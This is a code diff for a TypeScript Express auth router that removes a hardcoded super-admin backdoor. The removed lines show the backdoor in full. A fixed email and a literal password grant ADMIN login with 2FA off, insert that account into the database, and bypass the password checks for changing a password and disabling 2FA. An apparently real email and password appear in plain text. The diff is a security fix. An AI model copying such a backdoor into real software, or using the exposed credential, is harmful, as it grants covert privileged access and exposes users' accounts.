@@ -37,60 +37,14 @@ authRouter.post('/login', async (req: Request, res: Response) => {
     return;
   }
 
-  // Parameterized lookup
+  // Lookup user
   const users = await query<any>(
     'SELECT * FROM `users` WHERE LOWER(`email`) = ? LIMIT 1;',
     [cleanEmail]
   );
 
-  const isSuperAdmin = cleanEmail === 'ishmaelt42@gmail.com';
-
-  let user = users[0];
-  if (!user && isSuperAdmin && password === 'Tatenda3@4') {
-    user = {
-      id: 'usr-super-admin-ishmael',
-      org_id: 'org-omnitech',
-      email: 'ishmaelt42@gmail.com',
-      full_name: 'Ishmael (Super Admin)',
-      role: 'ADMIN',
-      status: 'ACTIVE',
-      department_id: 'dept-sec',
-      department_name: 'Cybersecurity & InfoSec',
-      branch_id: 'branch-ny',
-      branch_name: 'New York Global HQ',
-      two_factor_enabled: 0
-    };
-
-    // Auto-persist super admin record to database if not present
-    try {
-      const superHash = await hashPassword('Tatenda3@4');
-      await query(`
-        INSERT INTO \`users\` (
-          \`id\`, \`org_id\`, \`email\`, \`password_hash\`, \`full_name\`, \`role\`,
-          \`status\`, \`department_id\`, \`department_name\`, \`branch_id\`, \`branch_name\`, \`two_factor_enabled\`
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ON DUPLICATE KEY UPDATE
-          \`password_hash\` = VALUES(\`password_hash\`),
-          \`role\` = VALUES(\`role\`),
-          \`status\` = VALUES(\`status\`);
-      `, [
-        user.id,
-        user.org_id,
-        user.email,
-        superHash,
-        user.full_name,
-        user.role,
-        user.status,
-        user.department_id,
-        user.department_name,
-        user.branch_id,
-        user.branch_name,
-        0
-      ]);
-    } catch {
-      // In-memory fallback
-    }
-  } else if (!user) {
+  const user = users[0];
+  if (!user) {
     recordFailedLogin(cleanEmail);
     res.status(401).json({ error: 'Invalid corporate credentials.' });
     return;
@@ -110,13 +64,8 @@ authRouter.post('/login', async (req: Request, res: Response) => {
 
   // Password verification
   let validPassword = false;
-  if (isSuperAdmin && password === 'Tatenda3@4') {
-    validPassword = true;
-  } else if (user.password_hash) {
+  if (user.password_hash) {
     validPassword = await verifyPassword(password, user.password_hash);
-  } else if (process.env.NODE_ENV !== 'production' && user.password) {
-    // Un-migrated plaintext in dev fallback
-    validPassword = user.password === password;
   }
 
   if (!validPassword) {
@@ -211,23 +160,7 @@ authRouter.get('/me', authenticate, async (req: Request, res: Response) => {
     [req.auth!.userId]
   );
 
-  let u = users[0];
-  if (!u && req.auth!.email === 'ishmaelt42@gmail.com') {
-    u = {
-      id: req.auth!.userId,
-      org_id: req.auth!.orgId,
-      email: req.auth!.email,
-      full_name: req.auth!.fullName,
-      role: req.auth!.role,
-      department_id: 'dept-sec',
-      department_name: 'Cybersecurity & InfoSec',
-      branch_id: req.auth!.branchId,
-      branch_name: req.auth!.branchName,
-      two_factor_enabled: 0,
-      avatar: '',
-      status: 'ACTIVE'
-    };
-  }
+  const u = users[0];
 
   if (!u) {
     res.status(404).json({ error: 'User profile not found.' });
@@ -341,17 +274,11 @@ authRouter.post('/change-password', authenticate, async (req: Request, res: Resp
   }
 
   const users = await query<any>('SELECT * FROM `users` WHERE `id` = ? LIMIT 1;', [userId]);
-  let user = users[0];
+  const user = users[0];
 
-  const isSuperAdmin = email === 'ishmaelt42@gmail.com';
   let validCurrent = false;
-
-  if (isSuperAdmin && currentPassword === 'Tatenda3@4') {
-    validCurrent = true;
-  } else if (user && user.password_hash) {
+  if (user && user.password_hash) {
     validCurrent = await verifyPassword(currentPassword, user.password_hash);
-  } else if (process.env.NODE_ENV !== 'production' && user?.password) {
-    validCurrent = user.password === currentPassword;
   }
 
   if (!validCurrent) {
@@ -380,12 +307,8 @@ authRouter.post('/2fa/disable', authenticate, async (req: Request, res: Response
   const users = await query<any>('SELECT * FROM `users` WHERE `id` = ? LIMIT 1;', [userId]);
   const user = users[0];
 
-  const isSuperAdmin = email === 'ishmaelt42@gmail.com';
   let validCurrent = false;
-
-  if (isSuperAdmin && password === 'Tatenda3@4') {
-    validCurrent = true;
-  } else if (user && user.password_hash) {
+  if (user && user.password_hash) {
     validCurrent = await verifyPassword(password, user.password_hash);
   }
 
